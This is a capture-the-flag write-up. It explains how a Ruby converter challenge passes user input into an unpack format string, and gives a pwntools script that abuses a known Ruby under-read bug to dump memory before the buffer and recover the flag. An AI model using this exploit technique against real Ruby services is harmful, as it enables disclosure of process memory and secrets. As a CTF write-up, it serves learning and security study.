## mini converter

We are given a simple ruby script that converts between types -- hex to string, hex to integer, integer to string, etc.

We quickly noticed that our input is used as part of format specifier in the argument for `unpack`, and found that there was a buffer under-read vulnerability in `pack_unpack_internal()` function in Ruby reported on Hackerone (https://hackerone.com/reports/298246). 



```ruby
   elsif flag == 2
	    if num == 1
		    puts "string to integer"
            STDOUT.flush
            puts input.unpack("C*#{input}.length")
            STDOUT.flush
```

From the "string to integer" case, we could easily trigger the bug by providing a large, thus becoming negative in signed length, `len` value with '@' type to read memory before our buffer.

Since we didn't know exactly where the flag content would appear in memory, we just looped through and see if we get anything that has "FLAG" string in it.

```python
#!/usr/bin/env python
from pwn import *

N = 0x100000

r = remote('110.10.147.105', 12137)

r.readuntil('type exit if you want to exit')
r.sendline('@%dC%d' % ((1 << 64) - N, N))
r.readuntil('2. hex')
r.sendline('1')
r.readuntil('string to integer\n')

import sys
for _ in xrange(N / 1024):
    s = ''
    for _ in xrange(1024):
        s += chr(int(r.readuntil('\n')))
    sys.stdout.write(s)
```

```bash
python solve.py | strings | grep FLAG
```

Flag was `FLAG{Run away with me.It'll be the way you want it}`